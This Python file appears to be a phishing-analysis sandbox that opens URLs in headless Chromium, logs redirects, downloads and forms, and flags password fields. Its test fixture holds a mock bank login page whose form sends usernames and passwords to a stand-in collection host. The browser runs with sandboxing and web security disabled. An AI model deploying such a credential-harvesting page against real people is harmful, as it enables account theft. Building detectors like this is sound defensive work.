import asyncio
from playwright.async_api import async_playwright, Request, Response
import base64
import time
import uuid

async def run_sandbox_analysis(url: str):
    """
    Safely opens a URL in a headless Chromium browser,
    detects login forms, tracks network/redirects, monitors downloads,
    and takes a screenshot.
    """
    events = []
    has_login_form = False
    has_password_field = False
    screenshot_b64 = None
    
    start_time = time.time()
    
    def add_event(evt_type, severity, metadata):
        events.append({
            "event_id": str(uuid.uuid4()),
            "timestamp": time.time(),
            "event_type": evt_type,
            "severity": severity,
            "metadata": metadata
        })

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-gpu",
                "--disable-web-security",
            ]
        )
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            ignore_https_errors=True,
            accept_downloads=True
        )
        
        page = await context.new_page()
        
        # 1. Network Monitor
        async def handle_request(request: Request):
            # Redact headers
            safe_headers = {k: v for k, v in request.headers.items() if k.lower() not in ['authorization', 'cookie']}
            
            add_event("REQUEST", "INFO", {
                "method": request.method,
                "url": request.url,
                "resource_type": request.resource_type
            })
            
            if request.is_navigation_request():
                if request.redirected_from:
                    add_event("REDIRECT", "WARNING", {
                        "source": request.redirected_from.url,
                        "destination": request.url,
                        "method": request.method
                    })

        async def handle_response(response: Response):
            add_event("RESPONSE", "INFO", {
                "url": response.url,
                "status_code": response.status,
                "content_type": response.headers.get("content-type", "unknown")
            })

        page.on("request", handle_request)
        page.on("response", handle_response)
        
        # 2. Download Monitor
        async def handle_download(download):
            add_event("DOWNLOAD_DETECTED", "HIGH", {
                "filename": download.suggested_filename,
                "url": download.url
            })
            await download.cancel()
            
        page.on("download", handle_download)
        
        # Test Fixtures Mocking
        async def handle_route(route, request):
            if "chasebank-security-login.test" in request.url:
                html = '''
                <html>
                <head><title>Secure Login</title></head>
                <body>
                    <h1>Confirm your identity</h1>
                    <form action="http://malicious-drop.com/collect" method="POST">
                        <input type="text" name="username" />
                        <input type="password" name="password" />
                        <button type="submit">Login</button>
                    </form>
                    <script>
                        // Simulate multiple redirects before showing page if url contains urgent-update
                        if(window.location.href.includes("urgent-update") && !window.location.href.includes("redir=2")) {
                            window.location.href = window.location.href + "?redir=2";
                        }
                    </script>
                </body>
                </html>
                '''
                await route.fulfill(status=200, content_type="text/html", body=html)
            else:
                await route.continue_()
                
        await page.route("**/*", handle_route)
        
        try:
            add_event("PAGE_CREATED", "INFO", {"url": url})
            
            # Navigate with a strict timeout (15 seconds)
            response = await page.goto(url, timeout=15000, wait_until="networkidle")
            
            add_event("PAGE_NAVIGATED", "INFO", {"title": await page.title()})
            
            # 3. DOM & Form Analyzer
            forms_count = await page.locator("form").count()
            if forms_count > 0:
                has_login_form = True
                # Extract external form destinations
                for i in range(forms_count):
                    form = page.locator("form").nth(i)
                    action = await form.get_attribute("action")
                    if action and action.startswith("http") and not action.startswith(url):
                        add_event("FORM_DETECTED", "HIGH", {"action": action, "external": True})
                    else:
                        add_event("FORM_DETECTED", "MEDIUM", {"action": action, "external": False})
                        
            # Analyze for password fields specifically (credential harvesting)
            password_inputs = await page.locator('input[type="password"]').count()
            if password_inputs > 0:
                has_password_field = True
                add_event("PASSWORD_FIELD_DETECTED", "CRITICAL", {"evidence": "Credential harvesting risk: Password field detected"})
                
            # Take screenshot of what the victim sees
            screenshot_bytes = await page.screenshot(type="jpeg", quality=60)
            screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
            
        except Exception as e:
            add_event("CONSOLE_ERROR", "ERROR", {"error": str(e)})
            
        finally:
            await browser.close()
            
    duration = time.time() - start_time
    
    return {
        "events": events,
        "screenshot_base64": screenshot_b64,
        "has_login_form": has_login_form,
        "has_password_field": has_password_field,
        "duration_seconds": round(duration, 2)
    }
